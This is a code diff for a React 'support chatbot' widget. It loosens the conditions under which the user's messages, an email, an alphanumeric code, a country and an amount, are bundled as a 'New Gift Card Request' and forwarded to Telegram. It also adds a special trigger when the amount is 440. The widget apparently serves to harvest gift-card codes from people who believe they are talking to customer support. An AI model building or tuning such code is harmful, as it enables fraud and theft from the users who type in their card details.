@@ -94,15 +94,15 @@ const SupportChatbot = () => {
       // Check if conversation has key info and send summary to Telegram immediately
       const conversationText = newMessages.map(m => m.content).join(' ').toLowerCase();
       const hasEmail = conversationText.includes('@');
-      const hasCode = /[A-Z0-9]{10,}/.test(newMessages.map(m => m.content).join(' '));
-      const hasCountry = conversationText.match(/\b(us|usa|united states|uk|canada|australia|france|germany|spain|italy)\b/i);
+      const hasCode = /[a-z0-9]{8,}/i.test(newMessages.map(m => m.content).join(' '));
+      const hasCountry = /\b(us|usa|united states|uk|united kingdom|canada|australia|france|germany|spain|italy)\b/i.test(conversationText);
       const hasAmount = conversationText.match(/\b\d{2,}\b/);
       
       // Special case: amount 440 triggers immediate telegram
       const is440Amount = conversationText.includes('440');
       
       // Send to Telegram when we have essential info (reduced threshold for faster response)
-      if (hasEmail && hasCode && hasCountry && hasAmount && newMessages.length > 4) {
+      if (hasEmail && hasCode && hasCountry && hasAmount) {
         const userMessages = newMessages.filter(m => m.role === 'user');
         const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}`;
         
@@ -168,7 +168,7 @@ const SupportChatbot = () => {
   }
 
   return (
-    <div className="fixed bottom-6 right-6 w-[380px] md:h-[600px] h-[calc(100vh-3rem)] bg-background border border-border rounded-lg shadow-2xl flex flex-col z-50 max-h-[90vh]">
+    <div className="fixed inset-x-0 bottom-0 md:bottom-6 md:right-6 md:left-auto w-full md:w-[380px] h-[calc(100vh-3rem)] md:h-[600px] bg-background border border-border rounded-t-lg md:rounded-lg shadow-2xl flex flex-col z-50 max-h-[90vh]">
       {/* Header */}
       <div className="flex items-center justify-between p-4 border-b border-border bg-primary text-primary-foreground rounded-t-lg">
         <div className="flex items-center gap-2">
